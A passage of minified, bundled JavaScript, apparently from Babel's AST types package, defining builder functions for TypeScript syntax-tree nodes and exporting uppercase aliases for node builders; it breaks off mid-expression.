Xr(X=null,J=null,Q,Y=null){let W={type:"TSDeclareFunction",id:X,typeParameters:J,params:Q,returnType:Y},G=E.TSDeclareFunction;return j(G.id,W,"id",X,1),j(G.typeParameters,W,"typeParameters",J,1),j(G.params,W,"params",Q,1),j(G.returnType,W,"returnType",Y,1),W}function Jr(X=null,J,Q=null,Y,W=null){let G={type:"TSDeclareMethod",decorators:X,key:J,typeParameters:Q,params:Y,returnType:W},H=E.TSDeclareMethod;return j(H.decorators,G,"decorators",X,1),j(H.key,G,"key",J,1),j(H.typeParameters,G,"typeParameters",Q,1),j(H.params,G,"params",Y,1),j(H.returnType,G,"returnType",W,1),G}function Qr(X,J){let Q={type:"TSQualifiedName",left:X,right:J},Y=E.TSQualifiedName;return j(Y.left,Q,"left",X,1),j(Y.right,Q,"right",J,1),Q}function Yr(X=null,J,Q=null){let Y={type:"TSCallSignatureDeclaration",typeParameters:X,parameters:J,typeAnnotation:Q},W=E.TSCallSignatureDeclaration;return j(W.typeParameters,Y,"typeParameters",X,1),j(W.parameters,Y,"parameters",J,1),j(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function Wr(X=null,J,Q=null){let Y={type:"TSConstructSignatureDeclaration",typeParameters:X,parameters:J,typeAnnotation:Q},W=E.TSConstructSignatureDeclaration;return j(W.typeParameters,Y,"typeParameters",X,1),j(W.parameters,Y,"parameters",J,1),j(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function Gr(X,J=null){let Q={type:"TSPropertySignature",key:X,typeAnnotation:J},Y=E.TSPropertySignature;return j(Y.key,Q,"key",X,1),j(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function Hr(X,J=null,Q,Y=null){let W={type:"TSMethodSignature",key:X,typeParameters:J,parameters:Q,typeAnnotation:Y,kind:null},G=E.TSMethodSignature;return j(G.key,W,"key",X,1),j(G.typeParameters,W,"typeParameters",J,1),j(G.parameters,W,"parameters",Q,1),j(G.typeAnnotation,W,"typeAnnotation",Y,1),W}function zr(X,J=null){let Q={type:"TSIndexSignature",parameters:X,typeAnnotation:J},Y=E.TSIndexSignature;return j(Y.parameters,Q,"parameters",X,1),j(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function $r(){return{type:"TSAnyKeyword"}}function Vr(){return{type:"TSBooleanKeyword"}}function Kr(){return{type:"TSBigIntKeyword"}}function Ur(){return{type:"TSIntrinsicKeyword"}}function Zr(){return{type:"TSNeverKeyword"}}function qr(){return{type:"TSNullKeyword"}}function Br(){return{type:"TSNumberKeyword"}}function Mr(){return{type:"TSObjectKeyword"}}function jr(){return{type:"TSStringKeyword"}}function Or(){return{type:"TSSymbolKeyword"}}function Fr(){return{type:"TSUndefinedKeyword"}}function Rr(){return{type:"TSUnknownKeyword"}}function Ar(){return{type:"TSVoidKeyword"}}function Dr(){return{type:"TSThisType"}}function wr(X=null,J,Q=null){let Y={type:"TSFunctionType",typeParameters:X,parameters:J,typeAnnotation:Q},W=E.TSFunctionType;return j(W.typeParameters,Y,"typeParameters",X,1),j(W.parameters,Y,"parameters",J,1),j(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function Nr(X=null,J,Q=null){let Y={type:"TSConstructorType",typeParameters:X,parameters:J,typeAnnotation:Q},W=E.TSConstructorType;return j(W.typeParameters,Y,"typeParameters",X,1),j(W.parameters,Y,"parameters",J,1),j(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function Lr(X,J=null){let Q={type:"TSTypeReference",typeName:X,typeParameters:J},Y=E.TSTypeReference;return j(Y.typeName,Q,"typeName",X,1),j(Y.typeParameters,Q,"typeParameters",J,1),Q}function Ir(X,J=null,Q=null){let Y={type:"TSTypePredicate",parameterName:X,typeAnnotation:J,asserts:Q},W=E.TSTypePredicate;return j(W.parameterName,Y,"parameterName",X,1),j(W.typeAnnotation,Y,"typeAnnotation",J,1),j(W.asserts,Y,"asserts",Q),Y}function Cr(X,J=null){let Q={type:"TSTypeQuery",exprName:X,typeParameters:J},Y=E.TSTypeQuery;return j(Y.exprName,Q,"exprName",X,1),j(Y.typeParameters,Q,"typeParameters",J,1),Q}function Pr(X){let J={type:"TSTypeLiteral",members:X},Q=E.TSTypeLiteral;return j(Q.members,J,"members",X,1),J}function Sr(X){let J={type:"TSArrayType",elementType:X},Q=E.TSArrayType;return j(Q.elementType,J,"elementType",X,1),J}function Tr(X){let J={type:"TSTupleType",elementTypes:X},Q=E.TSTupleType;return j(Q.elementTypes,J,"elementTypes",X,1),J}function _r(X){let J={type:"TSOptionalType",typeAnnotation:X},Q=E.TSOptionalType;return j(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function Er(X){let J={type:"TSRestType",typeAnnotation:X},Q=E.TSRestType;return j(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function kr(X,J,Q=!1){let Y={type:"TSNamedTupleMember",label:X,elementType:J,optional:Q},W=E.TSNamedTupleMember;return j(W.label,Y,"label",X,1),j(W.elementType,Y,"elementType",J,1),j(W.optional,Y,"optional",Q),Y}function br(X){let J={type:"TSUnionType",types:X},Q=E.TSUnionType;return j(Q.types,J,"types",X,1),J}function vr(X){let J={type:"TSIntersectionType",types:X},Q=E.TSIntersectionType;return j(Q.types,J,"types",X,1),J}function fr(X,J,Q,Y){let W={type:"TSConditionalType",checkType:X,extendsType:J,trueType:Q,falseType:Y},G=E.TSConditionalType;return j(G.checkType,W,"checkType",X,1),j(G.extendsType,W,"extendsType",J,1),j(G.trueType,W,"trueType",Q,1),j(G.falseType,W,"falseType",Y,1),W}function xr(X){let J={type:"TSInferType",typeParameter:X},Q=E.TSInferType;return j(Q.typeParameter,J,"typeParameter",X,1),J}function hr(X){let J={type:"TSParenthesizedType",typeAnnotation:X},Q=E.TSParenthesizedType;return j(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function yr(X,J="keyof"){let Q={type:"TSTypeOperator",typeAnnotation:X,operator:J},Y=E.TSTypeOperator;return j(Y.typeAnnotation,Q,"typeAnnotation",X,1),j(Y.operator,Q,"operator",J),Q}function gr(X,J){let Q={type:"TSIndexedAccessType",objectType:X,indexType:J},Y=E.TSIndexedAccessType;return j(Y.objectType,Q,"objectType",X,1),j(Y.indexType,Q,"indexType",J,1),Q}function mr(X,J=null,Q=null){let Y={type:"TSMappedType",typeParameter:X,typeAnnotation:J,nameType:Q},W=E.TSMappedType;return j(W.typeParameter,Y,"typeParameter",X,1),j(W.typeAnnotation,Y,"typeAnnotation",J,1),j(W.nameType,Y,"nameType",Q,1),Y}function ur(X,J){let Q={type:"TSTemplateLiteralType",quasis:X,types:J},Y=E.TSTemplateLiteralType;return j(Y.quasis,Q,"quasis",X,1),j(Y.types,Q,"types",J,1),Q}function cr(X){let J={type:"TSLiteralType",literal:X},Q=E.TSLiteralType;return j(Q.literal,J,"literal",X,1),J}function lr(X,J=null){let Q={type:"TSExpressionWithTypeArguments",expression:X,typeParameters:J},Y=E.TSExpressionWithTypeArguments;return j(Y.expression,Q,"expression",X,1),j(Y.typeParameters,Q,"typeParameters",J,1),Q}function pr(X,J=null,Q=null,Y){let W={type:"TSInterfaceDeclaration",id:X,typeParameters:J,extends:Q,body:Y},G=E.TSInterfaceDeclaration;return j(G.id,W,"id",X,1),j(G.typeParameters,W,"typeParameters",J,1),j(G.extends,W,"extends",Q,1),j(G.body,W,"body",Y,1),W}function dr(X){let J={type:"TSInterfaceBody",body:X},Q=E.TSInterfaceBody;return j(Q.body,J,"body",X,1),J}function ir(X,J=null,Q){let Y={type:"TSTypeAliasDeclaration",id:X,typeParameters:J,typeAnnotation:Q},W=E.TSTypeAliasDeclaration;return j(W.id,Y,"id",X,1),j(W.typeParameters,Y,"typeParameters",J,1),j(W.typeAnnotation,Y,"typeAnnotation",Q,1),Y}function rr(X,J=null){let Q={type:"TSInstantiationExpression",expression:X,typeParameters:J},Y=E.TSInstantiationExpression;return j(Y.expression,Q,"expression",X,1),j(Y.typeParameters,Q,"typeParameters",J,1),Q}function ar(X,J){let Q={type:"TSAsExpression",expression:X,typeAnnotation:J},Y=E.TSAsExpression;return j(Y.expression,Q,"expression",X,1),j(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function nr(X,J){let Q={type:"TSSatisfiesExpression",expression:X,typeAnnotation:J},Y=E.TSSatisfiesExpression;return j(Y.expression,Q,"expression",X,1),j(Y.typeAnnotation,Q,"typeAnnotation",J,1),Q}function sr(X,J){let Q={type:"TSTypeAssertion",typeAnnotation:X,expression:J},Y=E.TSTypeAssertion;return j(Y.typeAnnotation,Q,"typeAnnotation",X,1),j(Y.expression,Q,"expression",J,1),Q}function or(X){let J={type:"TSEnumBody",members:X},Q=E.TSEnumBody;return j(Q.members,J,"members",X,1),J}function tr(X,J){let Q={type:"TSEnumDeclaration",id:X,members:J},Y=E.TSEnumDeclaration;return j(Y.id,Q,"id",X,1),j(Y.members,Q,"members",J,1),Q}function er(X,J=null){let Q={type:"TSEnumMember",id:X,initializer:J},Y=E.TSEnumMember;return j(Y.id,Q,"id",X,1),j(Y.initializer,Q,"initializer",J,1),Q}function Xa(X,J){let Q={type:"TSModuleDeclaration",id:X,body:J,kind:null},Y=E.TSModuleDeclaration;return j(Y.id,Q,"id",X,1),j(Y.body,Q,"body",J,1),Q}function Ja(X){let J={type:"TSModuleBlock",body:X},Q=E.TSModuleBlock;return j(Q.body,J,"body",X,1),J}function Qa(X,J=null,Q=null){let Y={type:"TSImportType",argument:X,qualifier:J,typeParameters:Q},W=E.TSImportType;return j(W.argument,Y,"argument",X,1),j(W.qualifier,Y,"qualifier",J,1),j(W.typeParameters,Y,"typeParameters",Q,1),Y}function Ya(X,J){let Q={type:"TSImportEqualsDeclaration",id:X,moduleReference:J,isExport:null},Y=E.TSImportEqualsDeclaration;return j(Y.id,Q,"id",X,1),j(Y.moduleReference,Q,"moduleReference",J,1),Q}function Wa(X){let J={type:"TSExternalModuleReference",expression:X},Q=E.TSExternalModuleReference;return j(Q.expression,J,"expression",X,1),J}function Ga(X){let J={type:"TSNonNullExpression",expression:X},Q=E.TSNonNullExpression;return j(Q.expression,J,"expression",X,1),J}function Ha(X){let J={type:"TSExportAssignment",expression:X},Q=E.TSExportAssignment;return j(Q.expression,J,"expression",X,1),J}function za(X){let J={type:"TSNamespaceExportDeclaration",id:X},Q=E.TSNamespaceExportDeclaration;return j(Q.id,J,"id",X,1),J}function $a(X){let J={type:"TSTypeAnnotation",typeAnnotation:X},Q=E.TSTypeAnnotation;return j(Q.typeAnnotation,J,"typeAnnotation",X,1),J}function Va(X){let J={type:"TSTypeParameterInstantiation",params:X},Q=E.TSTypeParameterInstantiation;return j(Q.params,J,"params",X,1),J}function Ka(X){let J={type:"TSTypeParameterDeclaration",params:X},Q=E.TSTypeParameterDeclaration;return j(Q.params,J,"params",X,1),J}function Ua(X=null,J=null,Q){let Y={type:"TSTypeParameter",constraint:X,default:J,name:Q},W=E.TSTypeParameter;return j(W.constraint,Y,"constraint",X,1),j(W.default,Y,"default",J,1),j(W.name,Y,"name",Q),Y}function Za(X){return(0,t5.default)("NumberLiteral","NumericLiteral","The node type "),oK(X)}function qa(X,J=""){return(0,t5.default)("RegexLiteral","RegExpLiteral","The node type "),tK(X,J)}function Ba(X){return(0,t5.default)("RestProperty","RestElement","The node type "),eK(X)}function Ma(X){return(0,t5.default)("SpreadProperty","SpreadElement","The node type "),XU(X)}});var HU=v((QU)=>{Object.defineProperty(QU,"__esModule",{value:!0});QU.JSXIdentifier=QU.JSXFragment=QU.JSXExpressionContainer=QU.JSXEmptyExpression=QU.JSXElement=QU.JSXClosingFragment=QU.JSXClosingElement=QU.JSXAttribute=QU.IntersectionTypeAnnotation=QU.InterpreterDirective=QU.InterfaceTypeAnnotation=QU.InterfaceExtends=QU.InterfaceDeclaration=QU.InferredPredicate=QU.IndexedAccessType=QU.ImportSpecifier=QU.ImportNamespaceSpecifier=QU.ImportExpression=QU.ImportDefaultSpecifier=QU.ImportDeclaration=QU.ImportAttribute=QU.Import=QU.IfStatement=QU.Identifier=QU.GenericTypeAnnotation=QU.FunctionTypeParam=QU.FunctionTypeAnnotation=QU.FunctionExpression=QU.FunctionDeclaration=QU.ForStatement=QU.ForOfStatement=QU.ForInStatement=QU.File=QU.ExpressionStatement=QU.ExportSpecifier=QU.ExportNamespaceSpecifier=QU.ExportNamedDeclaration=QU.ExportDefaultSpecifier=QU.ExportDefaultDeclaration=QU.ExportAllDeclaration=QU.ExistsTypeAnnotation=QU.EnumSymbolBody=QU.EnumStringMember=QU.EnumStringBody=QU.EnumNumberMember=QU.EnumNumberBody=QU.EnumDefaultedMember=QU.EnumDeclaration=QU.EnumBooleanMember=QU.EnumBooleanBody=QU.EmptyTypeAnnotation=QU.EmptyStatement=QU.DoWhileStatement=QU.DoExpression=QU.DirectiveLiteral=QU.Directive=QU.Decorator=QU.DeclaredPredicate=QU.DeclareVariable=QU.DeclareTypeAlias=QU.DeclareOpaqueType=QU.DeclareModuleExports=QU.DeclareModule=QU.DeclareInterface=QU.DeclareFunction=QU.DeclareExportDeclaration=QU.DeclareExportAllDeclaration=QU.DeclareClass=QU.DecimalLiteral=QU.DebuggerStatement=QU.ContinueStatement=QU.ConditionalExpression=QU.ClassProperty=QU.ClassPrivateProperty=QU.ClassPrivateMethod=QU.ClassMethod=QU.ClassImplements=QU.ClassExpression=QU.ClassDeclaration=QU.ClassBody=QU.ClassAccessorProperty=QU.CatchClause=QU.CallExpression=QU.BreakStatement=QU.BooleanTypeAnnotation=QU.BooleanLiteralTypeAnnotation=QU.BooleanLiteral=QU.BlockStatement=QU.BindExpression=QU.BinaryExpression=QU.BigIntLiteral=QU.AwaitExpression=QU.AssignmentPattern=QU.AssignmentExpression=QU.ArrowFunctionExpression=QU.ArrayTypeAnnotation=QU.ArrayPattern=QU.ArrayExpression=QU.ArgumentPlaceholder=QU.AnyTypeAnnotation=void 0;QU.TSNumberKeyword=QU.TSNullKeyword=QU.TSNonNullExpression=QU.TSNeverKeyword=QU.TSNamespaceExportDeclaration=QU.TSNamedTupleMember=QU.TSModuleDeclaration=QU.TSModuleBlock=QU.TSMethodSignature=QU.TSMappedType=QU.TSLiteralType=QU.TSIntrinsicKeyword=QU.TSIntersectionType=QU.TSInterfaceDeclaration=QU.TSInterfaceBody=QU.TSInstantiationExpression=QU.TSInferType=QU.TSIndexedAccessType=QU.TSIndexSignature=QU.TSImportType=QU.TSImportEqualsDeclaration=QU.TSFunctionType=QU.TSExternalModuleReference=QU.TSExpressionWithTypeArguments=QU.TSExportAssignment=QU.TSEnumMember=QU.TSEnumDeclaration=QU.TSEnumBody=QU.TSDeclareMethod=QU.TSDeclareFunction=QU.TSConstructorType=QU.TSConstructSignatureDeclaration=QU.TSConditionalType=QU.TSCallSignatureDeclaration=QU.TSBooleanKeyword=QU.TSBigIntKeyword=QU.TSAsExpression=QU.TSArrayType=QU.TSAnyKeyword=QU.SymbolTypeAnnotation=QU.SwitchStatement=QU.SwitchCase=QU.Super=QU.StringTypeAnnotation=QU.StringLiteralTypeAnnotation=QU.StringLiteral=QU.StaticBlock=QU.SpreadProperty=QU.SpreadElement=QU.SequenceExpression=QU.ReturnStatement=QU.RestProperty=QU.RestElement=QU.RegexLiteral=QU.RegExpLiteral=QU.RecordExpression=QU.QualifiedTypeIdentifier=QU.Program=QU.PrivateName=QU.Placeholder=QU.PipelineTopicExpression=QU.PipelinePrimaryTopicReference=QU.PipelineBareFunction=QU.ParenthesizedExpression=QU.OptionalMemberExpression=QU.OptionalIndexedAccessType=QU.OptionalCallExpression=QU.OpaqueType=QU.ObjectTypeSpreadProperty=QU.ObjectTypeProperty=QU.ObjectTypeInternalSlot=QU.ObjectTypeIndexer=QU.ObjectTypeCallProperty=QU.ObjectTypeAnnotation=QU.ObjectProperty=QU.ObjectPattern=QU.ObjectMethod=QU.ObjectExpression=QU.NumericLiteral=QU.NumberTypeAnnotation=QU.NumberLiteralTypeAnnotation=QU.NumberLiteral=QU.NullableTypeAnnotation=QU.NullLiteralTypeAnnotation=QU.NullLiteral=QU.Noop=QU.NewExpression=QU.ModuleExpression=QU.MixedTypeAnnotation=QU.MetaProperty=QU.MemberExpression=QU.LogicalExpression=QU.LabeledStatement=QU.JSXText=QU.JSXSpreadChild=QU.JSXSpreadAttribute=QU.JSXOpeningFragment=QU.JSXOpeningElement=QU.JSXNamespacedName=QU.JSXMemberExpression=void 0;QU.YieldExpression=QU.WithStatement=QU.WhileStatement=QU.VoidTypeAnnotation=QU.VoidPattern=QU.Variance=QU.VariableDeclarator=QU.VariableDeclaration=QU.V8IntrinsicIdentifier=QU.UpdateExpression=QU.UnionTypeAnnotation=QU.UnaryExpression=QU.TypeofTypeAnnotation=QU.TypeParameterInstantiation=QU.TypeParameterDeclaration=QU.TypeParameter=QU.TypeCastExpression=QU.TypeAnnotation=QU.TypeAlias=QU.TupleTypeAnnotation=QU.TupleExpression=QU.TryStatement=QU.TopicReference=QU.ThrowStatement=QU.ThisTypeAnnotation=QU.ThisExpression=QU.TemplateLiteral=QU.TemplateElement=QU.TaggedTemplateExpression=QU.TSVoidKeyword=QU.TSUnknownKeyword=QU.TSUnionType=QU.TSUndefinedKeyword=QU.TSTypeReference=QU.TSTypeQuery=QU.TSTypePredicate=QU.TSTypeParameterInstantiation=QU.TSTypeParameterDeclaration=QU.TSTypeParameter=QU.TSTypeOperator=QU.TSTypeLiteral=QU.TSTypeAssertion=QU.TSTypeAnnotation=QU.TSTypeAliasDeclaration=QU.TSTupleType=QU.TSThisType=QU.TSTemplateLiteralType=QU.TSSymbolKeyword=QU.TSStringKeyword=QU.TSSatisfiesExpression=QU.TSRestType=QU.TSQualifiedName=QU.TSPropertySignature=QU.TSParenthesizedType=QU.TSParameterProperty=QU.TSOptionalType=QU.TSObjectKeyword=void 0;var Q7=MY(),Tc1=m8();function C(X){return Q7[X]}var _c1=QU.ArrayExpression=C("arrayExpression"),Ec1=QU.AssignmentExpression=C("assignmentExpression"),kc1=QU.BinaryExpression=C("binaryExpression"),bc1=QU.InterpreterDirective=C("interpreterDirective"),vc1=QU.Directive=C("directive"),fc1=QU.DirectiveLiteral=C("directiveLiteral"),xc1=QU.BlockStatement=C("blockStatement"),hc1=QU.BreakStatement=C("breakStatement"),yc1=QU.CallExpression=C("callExpression"),gc1=QU.CatchClause=C("catchClause"),mc1=QU.ConditionalExpression=C("conditionalExpression"),uc1=QU.ContinueStatement=C("continueStatement"),cc1=QU.DebuggerStatement=C("debuggerStatement"),lc1=QU.DoWhileStatement=C("doWhileStatement"),pc1=QU.EmptyStatement=C("emptyStatement"),dc1=QU.ExpressionStatement=C("expressionStatement"),ic1=QU.File=C("file"),rc1=QU.ForInStatement=C("forInStatement"),ac1=QU.ForStatement=C("forStatement"),nc1=QU.FunctionDeclaration=C("functionDeclaration"),sc1=QU.FunctionExpression=C("functionExpression"),oc1=QU.Identifier=C("identifier"),tc1=QU.IfStatement=C("ifStatement"),ec1=QU.LabeledStatement=C("labeledStatement"),Xl1=QU.StringLiteral=C("stringLiteral"),Jl1=QU.NumericLiteral=C("numericLiteral"),Ql1=QU.NullLiteral=C("nullLiteral"),Yl1=QU.BooleanLiteral=C("booleanLiteral"),Wl1=QU.RegExpLiteral=C("regExpLiteral"),Gl1=QU.LogicalExpression=C("logicalExpression"),Hl1=QU.MemberExpression=C("memberExpression"),zl1=QU.NewExpression=C("newExpression"),$l1=QU.Program=C("program"),Vl1=QU.ObjectExpression=C("objectExpression"),Kl1=QU.ObjectMethod=C("objectMethod"),Ul1=QU.ObjectProperty=C("objectProperty"),Zl1=QU.RestElement=C("restElement"),ql1=QU.ReturnStatement=C("returnStatement"),Bl1=QU.SequenceExpression=C("sequenceExpression"),Ml1=QU.ParenthesizedExpression=C("parenthesizedExpression"),jl1=QU.SwitchCase=C("switchCase"),Ol1=QU.SwitchStatement=C("switchStatement"),Fl1=QU.ThisExpression=C("thisExpression"),Rl1=QU.ThrowStatement=C("throwStatement"),Al1=QU.TryStatement=C("tryStatement"),Dl1=QU.UnaryExpression=C("unaryExpression"),wl1=QU.UpdateExpression=C("updateExpression"),Nl1=QU.VariableDeclaration=C("variableDeclaration"),Ll1=QU.VariableDeclarator=C("variableDeclarator"),Il1=QU.WhileStatement=C("whileStatement"),Cl1=QU.WithStatement=C("withStatement"),Pl1=QU.AssignmentPattern=C("assignmentPattern"),Sl1=QU.ArrayPattern=C("arrayPattern"),Tl1=QU.ArrowFunctionExpression=C("arrowFunctionExpression"),_l1=QU.ClassBody=C("classBody"),El1=QU.ClassExpression=C("classExpression"),kl1=QU.ClassDeclaration=C("classDeclaration"),bl1=QU.ExportAllDeclaration=C("exportAllDeclaration"),vl1=QU.ExportDefaultDeclaration=C("exportDefaultDeclaration"),fl1=QU.ExportNamedDeclaration=C("exportNamedDeclaration"),xl1=QU.ExportSpecifier=C("exportSpecifier"),hl1=QU.ForOfStatement=C("forOfStatement"),yl1=QU.ImportDeclaration=C("importDeclaration"),gl1=QU.ImportDefaultSpecifier=C("importDefaultSpecifier"),ml1=QU.ImportNamespaceSpecifier=C("importNamespaceSpecifier"),ul1=QU.ImportSpecifier=C("importSpecifier"),cl1=QU.ImportExpression=C("importExpression"),ll1=QU.MetaProperty=C("metaProperty"),pl1=QU.ClassMethod=C("classMethod"),dl1=QU.ObjectPattern=C("objectPattern"),il1=QU.SpreadElement=C("spreadElement"),rl1=QU.Super=C("super"),al1=QU.TaggedTemplateExpression=C("taggedTemplateExpression"),nl1=QU.TemplateElement=C("templateElement"),sl1=QU.TemplateLiteral=C("templateLiteral"),ol1=QU.YieldExpression=C("yieldExpression"),tl1=QU.AwaitExpression=C("awaitExpression"),el1=QU.Import=C("import"),Xp1=QU.BigIntLiteral=C("bigIntLiteral"),Jp1=QU.ExportNamespaceSpecifier=C("exportNamespaceSpecifier"),Qp1=QU.OptionalMemberExpression=C("optionalMemberExpression"),Yp1=QU.OptionalCallExpression=C("optionalCallExpression"),Wp1=QU.ClassProperty=C("classProperty"),Gp1=QU.ClassAccessorProperty=C("classAccessorProperty"),Hp1=QU.ClassPrivateProperty=C("classPrivateProperty"),zp1=QU.ClassPrivateMethod=C("classPrivateMethod"),$p1=QU.PrivateName=C("privateName"),Vp1=QU.StaticBlock=C("staticBlock"),Kp1=QU.ImportAttribute=C("importAttribute"),Up1=QU.AnyTypeAnnotation=C("anyTypeAnnotation"),Zp1=QU.ArrayTypeAnnotation=C("arrayTypeAnnotation"),qp1=QU.BooleanTypeAnnotation=C("booleanTypeAnnotation"),Bp1=QU.BooleanLiteralTypeAnnotation=C("booleanLiteralTypeAnnotation"),Mp1=QU.NullLiteralTypeAnnotation=C("nullLiteralTypeAnnotation"),jp1=QU.ClassImplements=C("classImplements"),Op1=QU.DeclareClass=C("declareClass"),Fp1=QU.DeclareFunction=C("declareFunction"),Rp1=QU.DeclareInterface=C("declareInterface"),Ap1=QU.DeclareModule=C("declareModule"),Dp1=QU.DeclareModuleExports=C("declareModuleExports"),wp1=QU.DeclareTypeAlias=C("declareTypeAlias"),Np1=QU.DeclareOpaqueType=C("declareOpaqueType"),Lp1=QU.DeclareVariable=C("declareVariable"),Ip1=QU.DeclareExportDeclaration=C("declareExportDeclaration"),Cp1=QU.DeclareExportAllDeclaration=C("declareExportAllDeclaration"),Pp1=QU.DeclaredPredicate=C("declaredPredicate"),Sp1=QU.ExistsTypeAnnotation=C("existsTypeAnnotation"),Tp1=QU.FunctionTypeAnnotation=C("functionTypeAnnotation"),_p1=QU.FunctionTypeParam=C("functionTypeParam"),Ep1=QU.GenericTypeAnnotation=C("genericTypeAnnotation"),kp1=QU.InferredPredicate=C("inferredPredicate"),bp1=QU.InterfaceExtends=C("interfaceExtends"),vp1=QU.InterfaceDeclaration=C("interfaceDeclaration"),fp1=QU.InterfaceTypeAnnotation=C("interfaceTypeAnnotation"),xp1=QU.IntersectionTypeAnnotation=C("intersectionTypeAnnotation"),hp1=QU.MixedTypeAnnotation=C("mixedTypeAnnotation"),yp1=QU.EmptyTypeAnnotation=C("emptyTypeAnnotation"),gp1=QU.NullableTypeAnnotation=C("nullableTypeAnnotation"),mp1=QU.NumberLiteralTypeAnnotation=C("numberLiteralTypeAnnotation"),up1=QU.NumberTypeAnnotation=C("numberTypeAnnotation"),cp1=QU.ObjectTypeAnnotation=C("objectTypeAnnotation"),lp1=QU.ObjectTypeInternalSlot=C("objectTypeInternalSlot"),pp1=QU.ObjectTypeCallProperty=C("objectTypeCallProperty"),dp1=QU.ObjectTypeIndexer=C("objectTypeIndexer"),ip1=QU.ObjectTypeProperty=C("objectTypeProperty"),rp1=QU.ObjectTypeSpreadProperty=C("objectTypeSpreadProperty"),ap1=QU.OpaqueType=C("opaqueType"),np1=QU.QualifiedTypeIdentifier=C("qualifiedTypeIdentifier"),sp1=QU.StringLiteralTypeAnnotation=C("stringLiteralTypeAnnotation"),op1=QU.StringTypeAnnotation=C("stringTypeAnnotation"),tp1=QU.SymbolTypeAnnotation=C("symbolTypeAnnotation"),ep1=QU.ThisTypeAnnotation=C("thisTypeAnnotation"),Xd1=QU.TupleTypeAnnotation=C("tupleTypeAnnotation"),Jd1=QU.TypeofTypeAnnotation=C("typeofTypeAnnotation"),Qd1=QU.TypeAlias=C("typeAlias"),Yd1=QU.TypeAnnotation=C("typeAnnotation"),Wd1=QU.TypeCastExpression=C("typeCastExpression"),Gd1=QU.TypeParameter=C("typeParameter"),Hd1=QU.TypeParameterDeclaration=C("typeParameterDeclaration"),zd1=QU.TypeParameterInstantiation=C("typeParameterInstantiation"),$d1=QU.UnionTypeAnnotation=C("unionTypeAnnotation"),Vd1=QU.Variance=C("variance"),Kd1=QU.VoidTypeAnnotation=C("voidTypeAnnotation"),Ud1=QU.EnumDeclaration=C("enumDeclaration"),Zd1=QU.EnumBooleanBody=C("enumBooleanBody"),qd1=QU.EnumNumberBody=C("enumNumberBody"),Bd1=QU.EnumStringBody=C("enumStringBody"),Md1=QU.EnumSymbolBody=C("enumSymbolBody"),jd1=QU.EnumBooleanMember=C("enumBooleanMember"),Od1=QU.EnumNumberMember=C("enumNumberMember"),Fd1=QU.EnumStringMember=C("enumStringMember"),Rd1=QU.EnumDefaultedMember=C("enumDefaultedMember"),Ad1=QU.IndexedAccessType=C("indexedAccessType"),Dd1=QU.OptionalIndexedAccessType=C("optionalIndexedAccessType"),wd1=QU.JSXAttribute=C("jsxAttribute"),Nd1=QU.JSXClosingElement=C("jsxClosingElement"),Ld1=QU.JSXElement=C("jsxElement"),Id1=QU.JSXEmptyExpression=C("jsxEmptyExpression"),Cd1=QU.JSXExpressionContainer=C("jsxExpressionContainer"),Pd1=QU.JSXSpreadChild=C("jsxSpreadChild"),Sd1=QU.JSXIdentifier=C("jsxIdentifier"),Td1=QU.JSXMemberExpression=C("jsxMemberExpression"),_d1=QU.JSXNamespacedName=C("jsxNamespacedName"),Ed1=QU.JSXOpeningElement=C("jsxOpeningElement"),kd1=QU.JSXSpreadAttribute=C("jsxSpreadAttribute"),bd1=QU.JSXText=C("jsxText"),vd1=QU.JSXFragment=C("jsxFragment"),fd1=QU.JSXOpeningFragment=C("jsxOpeningFragment"),xd1=QU.JSXClosingFragment=C("jsxClosingFragment"),hd1=QU.Noop=C("noop"),yd1=QU.Placeholder=C("placeholder"),gd1=QU.V8IntrinsicIdentifier=C("v8IntrinsicIdentifier"),md1=QU.ArgumentPlaceholder=C("argumentPlaceholder"),ud1=QU.BindExpression=C("bindExpression"),cd1=QU.Decorator=C("decorator"),ld1=QU.DoExpression=C("doExpression"),pd1=QU.ExportDefaultSpecifier=C("exportDefaultSpecifier"),dd1=QU.RecordExpression=C("recordExpression"),id1=QU.TupleExpression=C("tupleExpression"),rd1=QU.DecimalLiteral=C("decimalLiteral"),ad1=QU.ModuleExpression=C("moduleExpression"),nd1=QU.TopicReference=C("topicReference"),sd1=QU.PipelineTopicExpression=C("pipelineTopicExpression"),od1=QU.PipelineBareFunction=C("pipelineBareFunction"),td1=QU.PipelinePrimaryTopicReference=C("pipelinePrimaryTopicReference"),ed1=QU.VoidPattern=C("voidPattern"),Xi1=QU.TSParameterProperty=C("tsParameterProperty"),Ji1=QU.TSDeclareFunction=C("tsDeclareFunction"),Qi1=QU.TSDeclareMethod=C("tsDeclareMethod"),Yi1=QU.TSQualifiedName=C("tsQualifiedName"),Wi1=QU.TSCallSignatureDeclaration=C("tsCallSignatureDeclaration"),Gi1=QU.TSConstructSignatureDeclaration=C("tsConstructSignatureDeclaration"),Hi1=QU.TSPropertySignature=C("tsPropertySignature"),zi1=QU.TSMethodSignature=C("tsMethodSignature"),$i1=QU.TSIndexSignature=C("tsIndexSignature"),Vi1=QU.TSAnyKeyword=C("tsAnyKeyword"),Ki1=QU.TSBooleanKeyword=C("tsBooleanKeyword"),Ui1=QU.TSBigIntKeyword=C("tsBigIntKeyword"),Zi1=QU.TSIntrinsicKeyword=C("tsIntrinsicKeyword"),qi1=QU.TSNeverKeyword=C("tsNeverKeyword"),Bi1=QU.TSNullKeyword=C("tsNullKeyword"),Mi1=QU.TSNumberKeyword=C("tsNumberKeyword"),ji1=QU.TSObjectKeyword=C("tsObjectKeyword"),Oi1=QU.TSStringKeyword=C("tsStringKeyword"),Fi1=QU.TSSymbolKeyword=C("tsSymbolKeyword"),Ri1=QU.TSUndefinedKeyword=C("tsUndefinedKeyword"),Ai1=QU.TSUnknownKeyword=C("tsUnknownKeyword"),Di1=QU.TSVoidKeyword=C("tsVoidKeyword"),wi1=QU.TSThisType=C("tsThisType"),Ni1=QU.TSFunctionType=C("tsFunctionType"),Li1=QU.TSConstructorType=C("tsConstructorType"),Ii1=QU.TSTypeReference=C("tsTypeReference"),Ci1=QU.TSTypePredicate=C("tsTypePredicate"),Pi1=QU.